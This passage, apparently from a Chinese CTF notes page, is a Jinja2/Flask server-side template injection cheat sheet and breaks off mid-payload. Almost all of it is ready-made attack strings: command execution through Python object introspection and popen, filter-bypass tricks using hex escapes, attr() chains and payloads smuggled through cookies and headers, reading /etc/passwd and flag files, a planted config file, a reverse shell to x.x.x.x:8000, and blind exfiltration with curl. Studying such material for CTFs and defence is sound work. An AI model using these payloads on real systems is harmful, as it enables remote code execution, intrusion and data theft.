class="hljs handlebars"><span class="language-xml">- ().__class__.__bases__[0].__subclasses__()[-4].__init__.__globals__[&#x27;system&#x27;](&#x27;1s&#x27;)</span><br><span class="language-xml">- &#x27;&#x27;.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)</span><br><span class="language-xml">- [].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#x27;system&#x27;](&#x27;ls&#x27;)</span><br><span class="language-xml"></span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">lipsum.__globals__</span>[&quot;os&quot;].popen(<span class="hljs-name">&#x27;id&#x27;</span>).read() &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">- &#123;% for x in ().__class__.__base__.__subclasses__() %&#125;&#123;% if &quot;warning&quot; in x.__name__ %&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">x</span>()._module.__builtins__[&#x27;__import__&#x27;](<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">&quot;cmd&quot;</span>).read()&#125;&#125;</span><span class="language-xml">&#123;%endif%&#125;&#123;% endfor %&#125;</span><br><span class="language-xml"></span><br><span class="language-xml">- *url_for.__globals__.os.__dict__.popen(request.args.file).read()，然后传参file，内容为要执行的命令</span><br><span class="language-xml">-* url_for.__globals__.os.environ, 拿环境变量</span><br><span class="language-xml">- *config.__class__.from_envvar.__globals__.__builtins__.__import__(request.args.a).getenv(request.args.b)，参数a是要导入的模块（os），参数b是环境变量名（把getenv换了就能执行别的了）http://example.com/?a=os&amp;b=HOME从请求参数 a 中指定的模块导入该模块，然后使用 request.args.b 作为参数调用 getenv 函数，获取环境变量的值并将其输出</span><br><span class="language-xml">- ().__class__.__base__.__subclasses__()[148]()._module.__builtins__[request.args.b](request.args.c).environ      148  warnings.catch_warnings    ?b=eval&amp;c=&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;</span><br><span class="language-xml">- ().__class__.mro()[1].__subclasses__()[337](get_flashed_messages.__class__.__mro__[1].__subclasses__()[3]((0x65,0x78,0x70,0x72,0x74)).decode(),shell=True,stdout=-1).communicate()[0].strip()     </span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">[&quot;\x5F\x5Fclass\x5F\x5F&quot;]</span>[&quot;\x5F\x5Fbases\x5F\x5F&quot;][0][&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;]()[91][&quot;get\x5Fdata&quot;](<span class="hljs-name">0</span>, <span class="hljs-string">&quot;/proc/self/fd/3&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">- *</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">&quot;&quot;.__class__.__base__</span> .__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">request.args.get</span>(<span class="hljs-name">&quot;cmd&quot;</span>)).read()&#125;&#125;</span><span class="language-xml">   get?cmd=cat /flag</span><br><span class="language-xml"></span><br><span class="language-xml">- 如果你想执行 ls 命令，可以将 (0x65,0x78,0x70,0x72,0x74) 替换为 (0x6c, 0x73)，即：</span><br><span class="language-xml"></span><br><span class="language-xml">​          </span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.mro</span>()[1].__subclasses__()[337](<span class="hljs-name">get_flashed_messages.__class__.__mro__</span>[1].__subclasses__()[3]((<span class="hljs-name">0x6c</span>, <span class="hljs-number">0</span>x73)).decode(),<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=-1).communicate()[0].strip()&#125;&#125;</span><span class="language-xml">这段代码将执行 ls 命令，并返回当前目录的内容。</span><br><span class="language-xml"></span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request</span>|attr(%<span class="hljs-name">27application</span>%<span class="hljs-number">27</span>)|attr(%<span class="hljs-name">27</span>\x5f\x5fglobals\x5f\x5f%<span class="hljs-number">27</span>)|attr(%<span class="hljs-name">27</span>\x5f\x5fgetitem\x5f\x5f%<span class="hljs-number">27</span>)(%<span class="hljs-name">27</span>\x5f\x5fbuil%<span class="hljs-number">27</span>%<span class="hljs-number">27</span>tins\x5f\x5f%<span class="hljs-number">27</span>)|attr(%<span class="hljs-name">27</span>\x5f\x5fgetitem\x5f\x5f%<span class="hljs-number">27</span>)(%<span class="hljs-name">27</span>\x5f\x5fimp%<span class="hljs-number">27</span>%<span class="hljs-number">27</span>ort\x5f\x5f%<span class="hljs-number">27</span>)(%<span class="hljs-name">27os</span>%<span class="hljs-number">27</span>)|attr(%<span class="hljs-name">27po</span>%<span class="hljs-number">27</span>%<span class="hljs-number">27</span>pen%<span class="hljs-number">27</span>)(%<span class="hljs-name">27cmd</span>%<span class="hljs-number">27</span>)|attr(%<span class="hljs-name">27read</span>%<span class="hljs-number">27</span>)()&#125;&#125;</span><span class="language-xml"> 使用时把cmd换成命令如ls</span><br><span class="language-xml"></span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123;%<span class="hljs-name">22</span>%<span class="hljs-number">22</span>|attr(%<span class="hljs-name">27</span>\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f%<span class="hljs-number">27</span>)|attr(%<span class="hljs-name">27</span>\x5f\x5f\x62\x61\x73\x65\x5f\x5f%<span class="hljs-number">27</span>)|attr(%<span class="hljs-name">27</span>\x5f\x5f\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73\x5f\x5f%<span class="hljs-number">27</span>)()|attr(%<span class="hljs-name">27</span>\x5f\x5fgetitem\x5f\x5f%<span class="hljs-number">27</span>)(<span class="hljs-name">411</span>)(%<span class="hljs-name">27cmd</span>%<span class="hljs-number">27</span>,<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=-1)|attr(%<span class="hljs-name">27communicate</span>%<span class="hljs-number">27</span>)()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">self</span>|attr(<span class="hljs-name">&quot;\x5f\x5fdict\x5f\x5f&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">- *可以用自定义header传命令：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">joiner.__init__.__globals__.os.popen</span>(<span class="hljs-name">request.headers.cmd</span>).read()&#125;&#125;</span><span class="language-xml">,然后header里添加cmd: cat flag.txt</span><br><span class="language-xml"></span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.__subclasses__</span>().__getitem__(<span class="hljs-name">455</span>)(<span class="hljs-name">request.args.shell</span>,<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=(<span class="hljs-name">1</span>).__neg__()).communicate()&#125;&#125;</span><span class="language-xml">:     用getitem绕[]过滤，(1).__neg__()绕负号过滤</span><br><span class="language-xml"></span><br><span class="language-xml">- 过滤方括号、下划线及引号。利用lipsum逃逸，|attr()代替方括号，并将带有下划线的项放在请求头，用request.pragma.0访问（有些header里面没法放下划线，Pragma可以，所以用多个Pragma传递带有下划线的项，数字表示第i个Pragma里的内容）</span><br><span class="language-xml"></span><br><span class="language-xml"> * </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">lipsum</span>|attr(<span class="hljs-name">request.pragma.0</span>)|attr(<span class="hljs-name">request.pragma.1</span>)(<span class="hljs-name">request.pragma.2</span>)|attr(<span class="hljs-name">request.pragma.3</span>)(<span class="hljs-name">request.pragma.4</span>)|attr(<span class="hljs-name">request.pragma.5</span>)(<span class="hljs-name">request.pragma.6</span>)|attr(<span class="hljs-name">request.pragma.7</span>)()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">  headers 可以是：</span><br><span class="language-xml"></span><br><span class="language-xml">  - Pragma: __globals__</span><br><span class="language-xml"></span><br><span class="language-xml">  - Pragma: __getitem__</span><br><span class="language-xml"></span><br><span class="language-xml">  - Pragma: __builtins__</span><br><span class="language-xml"></span><br><span class="language-xml">  - Pragma: __import__</span><br><span class="language-xml"></span><br><span class="language-xml">  - Pragma: os</span><br><span class="language-xml"></span><br><span class="language-xml">  - Pragma: popen</span><br><span class="language-xml"></span><br><span class="language-xml">  - Pragma: cat flag.txt</span><br><span class="language-xml"></span><br><span class="language-xml">  - Pragma: read</span><br><span class="language-xml">  ### 文件写入：</span><br><span class="language-xml"></span><br><span class="language-xml">- [].__class__.__base__.__base__.__subclasses__()[40](&#x27;/tmp/1&#x27;,&#x27;w&#x27;).write(&#x27;hello&#x27;)</span><br><span class="language-xml"></span><br><span class="language-xml">动态执行：</span><br><span class="language-xml"></span><br><span class="language-xml">例如 ?input=ls</span><br><span class="language-xml"></span><br><span class="language-xml">&#123;% for x in().__class__.__base__.__subelasses__() %&#125;&#123;% if &quot;warning&quot; in x.__name__%&#125;</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">x</span>().__module.__builtins__[&#x27;__import__&#x27;](<span class="hljs-name">&#x27;os&#x27;</span>).popen(<span class="hljs-name">request.args.input</span>).read()&#125;&#125;</span><span class="language-xml">&#123;%endif%&#125;&#123;%endfor%&#125;`</span><br></code></pre></td></tr></table></figure><h3 id="其他利用"><a href="#其他利用" class="headerlink" title="其他利用"></a><code>其他利用</code></h3><ul><li><code>通过编写一个邪恶的配置文件来利用 SSTI：</code><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="language-xml">*# evil config</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; &#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;/tmp/evilconfig.cfg&#x27;, &#x27;w&#x27;).write(&#x27;from subprocess import check_output\n\nRUNCMD = check_output\n&#x27;) &#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"># load the evil config</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; config.from_pyfile(&#x27;/tmp/evilconfig.cfg&#x27;) &#125;&#125;</span><span class="language-xml">  </span><br><span class="language-xml"></span><br><span class="language-xml"># connect to evil host</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123; config[&#x27;RUNCMD&#x27;](&#x27;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/x.x.x.x/8000 0&gt;&amp;1&quot;&#x27;,shell=True) &#125;&#125;</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="关键字过滤-利用request"><a href="#关键字过滤-利用request" class="headerlink" title="关键字过滤 - 利用request"></a><code>关键字过滤 - 利用request</code></h3><p><code>利用request, args特性（cookie等）：</code></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">- _class_</span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__bases__.__getitem__</span>(<span class="hljs-name">0</span>).__subclasses__().__pop(<span class="hljs-name">40</span>)(<span class="hljs-name">request.args.path</span>).read()&#125;&#125;</span><span class="language-xml">&amp;path=/etc/passwd</span><br><span class="language-xml">- http://localhost:5000/?exploit=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request</span>|attr((<span class="hljs-name">request.args.use</span>*<span class="hljs-number">2</span>,request.args.class,request.args.use*<span class="hljs-number">2</span>)|join)&#125;&#125;</span><span class="language-xml">&amp;class=class&amp;use-_</span><br><span class="language-xml">- http://localhost:5000/?exploit=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request</span>|attr(<span class="hljs-name">request.args_getlist</span>(<span class="hljs-name">request.args.l</span>)|join)&#125;&#125;</span><span class="language-xml">&amp;l=a&amp;a=_&amp;a=_&amp;a=class&amp;a=_&amp;a=_</span><br></code></pre></td></tr></table></figure><h3 id="盲命令执行"><a href="#盲命令执行" class="headerlink" title="盲命令执行"></a><code>盲命令执行</code></h3><p><code>利用curl将执行结果带出来：</code></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">｛% <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[<span class="hljs-number">2</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.func_globals.linecache.os.<span class="hljs-keyword">popen</span>(<span class="hljs-string">&#x27;curl http://ip: port?i=whoami&#x27;</span>).read()==<span class="hljs-string">&#x27;p&#x27;</span> %&#125;<span class="hljs-number">1</span>&#123;%endif %&#125;<br></code></pre></td></tr></table></figure><h3 id="绕过禁用的关键命令"><a href="#绕过禁用的关键命令" class="headerlink" title="绕过禁用的关键命令"></a><code>绕过禁用的关键命令</code></h3><p><code>一些禁用了ls，cat，os等关键命令的bypass：</code></p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sqf">- [].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">72</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;d&#x27;</span>+<span class="hljs-string">&#x27;1&#x27;</span>+<span class="hljs-string">&#x27;r&#x27;</span>)<br>- [].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">59</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;linecache&#x27;</span>].<span class="hljs-variable">__dict__</span>[<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>].system(<span class="hljs-string">&#x27;l&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>)<br>- [].<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">59</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__func_globals</span>[<span class="hljs-string">&#x27;linecache&#x27;</span>].<span class="hljs-variable">__dict__</span>.<span class="hljs-built_in">values</span>()[<span class="hljs-number">12</span>].system(<span class="hljs-string">&#x27;l&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="利用getattribute-字符串拼接"><a href="#利用getattribute-字符串拼接" class="headerlink" title="利用getattribute()+ 字符串拼接"></a><code>利用getattribute()+ 字符串拼接</code></h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">- <span class="hljs-selector-attr">[]</span>.__class__.__base__.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[72]</span>.__init__.<span class="hljs-built_in">__getattribute__</span>(<span class="hljs-string">&#x27;__global&#x27;</span>+<span class="hljs-string">&#x27;s__&#x27;</span>)<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;os&#x27;</span>]</span><span class="hljs-selector-class">.system</span>(<span class="hljs-string">&#x27;dir&#x27;</span>)<br>- <span class="hljs-selector-attr">[]</span>.__class__.__base__.<span class="hljs-built_in">__subclasses__</span>()<span class="hljs-selector-attr">[72]</span>.__init__.<span class="hljs-built_in">__getattribute__</span>(<span class="hljs-string">&#x27;5f5f676c6f62616c735f5f&#x27;</span><span class="hljs-selector-class">.decode</span>(<span class="hljs-string">&#x27;hex&#x27;</span>))<span class="hljs-selector-attr">[<span class="hljs-string">&#x27;os&#x27;</span>]</span><span class="hljs-selector-class">.system</span>(<span class="hljs-string">&#x27;dir&#x27;</span>)<br></code></pre></td></tr></table></figure><h3 id="关键字键字过滤-利用hex编码"><a href="#关键字键字过滤-利用hex编码" class="headerlink" title="关键字键字过滤 - 利用hex编码"></a><code>关键字键字过滤 - 利用hex编码</code></h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">- __builtins__<br>- ().__class__.__bases__[<span class="hljs-number">0</span>].__subclasses__()[<span class="hljs-number">59</span>].__init__.__globals__[&#x27;\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">62</span>\<span class="hljs-keyword">x</span><span class="hljs-number">75</span>\<span class="hljs-keyword">x</span><span class="hljs-number">69</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">74</span>\<span class="hljs-keyword">x</span><span class="hljs-number">69</span>\<span class="hljs-keyword">x</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span>\<span class="hljs-keyword">x</span><span class="hljs-number">73</span>\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f\<span class="hljs-keyword">x</span><span class="hljs-number">5</span>f&#x27;]<br></code></pre></td></tr></table></figure><h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤[]"></a><code>过滤[]</code></h3><p><code>引入__getitem__调用字典中的键值，比如说a[&#39;b&#39;]就可以用a.getitem(&#39;b&#39;)来表示：</code></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">- ?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">a.__init__.__globals__.__getitem__</span>(<span class="hljs-name">request.cookies.x</span>).eval(<span class="hljs-name">request.cookies.y</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">- cookie:x=__builtins__;y=__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()</span><br></code></pre></td></tr></table></figure><h3 id="常见过滤（’’，’-mro-and-base"><a href="#常见过滤（’’，’-mro-and-base" class="headerlink" title="常见过滤（’’，’, &#39;mro&#39; and &#39;base&#39;)"></a><code>常见过滤（’’，’, &#39;mro&#39; and &#39;base&#39;)</code></h3><p><code>Flask注入需要大量.，_，如果被过滤了可以用[]替代.，16进制编码替代_：</code></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">request</span>|attr(<span class="hljs-name">&#x27;application&#x27;</span>)|attr(<span class="hljs-name">&#x27;\x5f\x5fglobals\x5f\x5f&#x27;</span>)|attr(<span class="hljs-name">&#x27;\x5f\x5fgetitem\x5f\×5f&#x27;</span>)(<span class="hljs-name">&#x27;\x5f\x5fbuiltins\x5f\×5f&#x27;</span>)|attr(<span class="hljs-name">&#x27;\x5f\x5fgetitem\x5f\×5f&#x27;</span>)(<span class="hljs-name">&#x27;\x5f\x5fimport\x5f|x5f&#x27;</span>)(<span class="hljs-name">&#x27;os&#x27;</span>)|attr(<span class="hljs-name">&#x27;popen&#x27;</span>)(<span class="hljs-name">&#x27;id&#x27;</span>)|attr(<span class="hljs-name">&#x27;read&#x27;</span>)()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">- </span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">[&quot;\x5F\x5Fclass\x5F\x5F&quot;]</span>[&quot;\x5F\x5Fbases\x5F\x5F&quot;][0][&quot;\x5F\x5Fsubclasses\x5F\x5F&quot;]()[91][&quot;get\x5Fdata&quot;](<span class="hljs-name">0</span>, <span class="hljs-string">&quot;/proc/self/fd/3&quot;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">- &#123; &#123;()[&quot;\x5f\x5fclass\x5f\x5f&quot;][&quot;\x5f\x5fbases\x5f\x5f&quot;][0][&quot;\x5f\x5fsubclasses\x5f\x5f&quot;]()&#125;&#125;//寻找可用引用</span><br></code></pre></td></tr></table></figure><h3 id="导入模块"><a href="#导入模块" class="headerlink" title="导入模块"></a><code>导入模块</code></h3><ul><li><code>__import__(&#39;os&#39;)</code></li><li><code>__import__(&quot;bf&quot;.decode(&#39;rot_13&#39;))</code></li><li><code>__import__(&#39;o&#39;+&#39;s&#39;).system(&quot;whoami&quot;)</code></li><li><code>__import__(&#39;so&#39;[::-1]).system(&#39;whoami&#39;)</code></li><li><code>eval(&#39;)&quot;imaohw&quot;(metsys.)&quot;so&quot;(__tropmi__&#39;[::-1])</code></li><li><code>exec(&#39;)&quot;imaohw&quot;(metsys.so ;so_tropmi&#39;[::-1])</code></li><li><code>import importlib;importlib.import_module(&quot;os&quot;).system(&quot;whoami&quot;)</code></li><li><code>import sys;sys.modules[&#39;os&#39;]=&#39;not allowed&#39;;del sys.modules[&#39;os&#39;];import os</code></li><li><code>a=open(&#39;/usr/lib/python3.7/os.py&#39;).read();exec(a);system(&quot;whoami&quot;)</code></li><li><code>execfile(&#39;/usr/lib/python2.7/os.py&#39;);system (&quot;whoami&quot;) # ONLY Python2</code></li></ul><h3 id="下划线"><a href="#下划线" class="headerlink" title="下划线"></a><code>下划线</code></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>((),<span class="hljs-built_in">dir</span>(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*<span class="hljs-number">2</span>+<span class="hljs-string">&#x27;class&#x27;</span>+<span class="hljs-built_in">dir</span>(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*<span class="hljs-number">2</span>),<span class="hljs-built_in">dir</span>(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*<span class="hljs-number">2</span>+<span class="hljs-string">&#x27;bases&#x27;</span>+<span class="hljs-built_in">dir</span>(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*<span class="hljs-number">2</span>),<span class="hljs-built_in">dir</span>(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*<span class="hljs-number">2</span>+<span class="hljs-string">&#x27;getitem&#x27;</span>+<span class="hljs-built_in">dir</span>(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*<span class="hljs-number">2</span>)(<span class="hljs-number">0</span>),<span class="hljs-built_in">dir</span>(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*<span class="hljs-number">2</span>+<span class="hljs-string">&#x27;subclasses&#x27;</span>+<span class="hljs-built_in">dir</span>(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>]*<span class="hljs-number">2</span>)(),<span class="hljs-string">&#x27;pop&#x27;</span>)(<span class="hljs-number">37</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">*?name=&#123;&#123;(x|attr(request.cookies.x1)|attr(request.cookies.x2)|attr(request.cookies.x3))(request.cookies.x4).<span class="hljs-built_in">eval</span>(request.cookies.x5)&#125;&#125;<br></code></pre></td></tr></table></figure><p><code>Cookie传参：</code></p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">x1=<span class="hljs-variable">__init__</span>;x2=<span class="hljs-variable">__globals__</span>;x3=<span class="hljs-variable">__getitem__</span>;x4=<span class="hljs-variable">__builtins__</span>;x5=<span class="hljs-variable">__import__</span>(<span class="hljs-string">&#x27;os&#x27;</span>).popen(<span class="hljs-string">&#x27;cat /f*&#x27;</span>).read()<br></code></pre></td></tr></table></figure><h3 id="使用绕过再借助print-回显"><a href="#使用绕过再借助print-回显" class="headerlink" title="使用绕过再借助print()回显&#96;"></a><code>使用</code>绕过再借助print()回显&#96;</h3><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">- ?name=</span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">print</span>((abc<span class="hljs-punctuation">|</span>attr(request.cookies.a)<span class="hljs-punctuation">|</span>attr(request.cookies.b)<span class="hljs-punctuation">|</span>attr(request.cookies.c))(request.cookies.d).eval(request.cookies.e))<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml">- Cookie:a=__init__;b=__globals__;c=__getitem__;d=__builtins__;e=__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br><span class="language-xml">- ?name=</span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">print</span>((x<span class="hljs-punctuation">|</span>attr(request.cookies.x<span class="hljs-number">1</span>)<span class="hljs-punctuation">|</span>attr(request.cookies.x<span class="hljs-number">2</span>)<span class="hljs-punctuation">|</span>attr(request.cookies.x<span class="hljs-number">3</span>))(request.cookies.x<span class="hljs-number">4</span>).eval(request.cookies.x<span class="hljs-number">5</span>))<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">- </span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">print</span>(lipsum<span class="hljs-punctuation">|</span>attr(%<span class="hljs-number">27</span>\u<span class="hljs-number">005</span>f\x<span class="hljs-number">5</span>f\u<span class="hljs-number">0067</span>\x<span class="hljs-number">6</span>c\u<span class="hljs-number">006</span>f\x<span class="hljs-number">62</span>\x<span class="hljs-number">61</span>\x<span class="hljs-number">6</span>c\x<span class="hljs-number">73</span>\x<span class="hljs-number">5</span>f\x<span class="hljs-number">5</span>f%<span class="hljs-number">27</span>))<span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><h3 id="过滤了数字"><a href="#过滤了数字" class="headerlink" title="过滤了数字"></a><code>过滤了数字</code></h3><ul><li><code>构造出1: &#123;&#123;(dict(e=a)|join|count)&#125;&#125;</code></li></ul><h3 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a><code>关键字绕过</code></h3><ul><li><code>class, base</code><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-variable">&#123;&#123;dict(__cl=a,ass__=a)|<span class="hljs-name">join</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure><code>还可以使用全角的数字绕过：</code></li><li><code>０１２３４５６７８９</code></li></ul><h3 id="SSTI武器库"><a href="#SSTI武器库" class="headerlink" title="SSTI武器库"></a><code>SSTI武器库</code></h3><ol><li><code>任意命令执行:</code><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-name">for</span></span> i <span class="hljs-keyword">in</span> &#x27;&#x27;.__class__.__base__.__subclasses__()%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-name">if</span></span> i.__name__ ==&#x27;_wrap_close&#x27;%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name">print</span> i.__init__.__globals__[&#x27;popen&#x27;](&#x27;dir&#x27;).read()%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-name">endif</span></span>%&#125;</span><span class="hljs-template-tag">&#123;%<span class="hljs-name"><span class="hljs-name">endfor</span></span>%&#125;</span><br></code></pre></td></tr></table></figure></li><li><code>任意命令执行:</code><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-variable">&#123;&#123;&quot;&quot;.__class__.__bases__[0]. __subclasses__()[138].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure></li></ol><ul><li><code>这个138对应的类是os._wrap_close，只需要找到这个类的索引就可以利用这个payload</code></li></ul><ol start="3"><li><code>任意命令执行:</code><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-variable">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;)&#125;&#125;</span><br></code></pre></td></tr></table></figure></li><li><code>任意命令执行:</code><figure class="highlight jinja"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja"><span class="hljs-template-variable">&#123;&#123;x.__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat 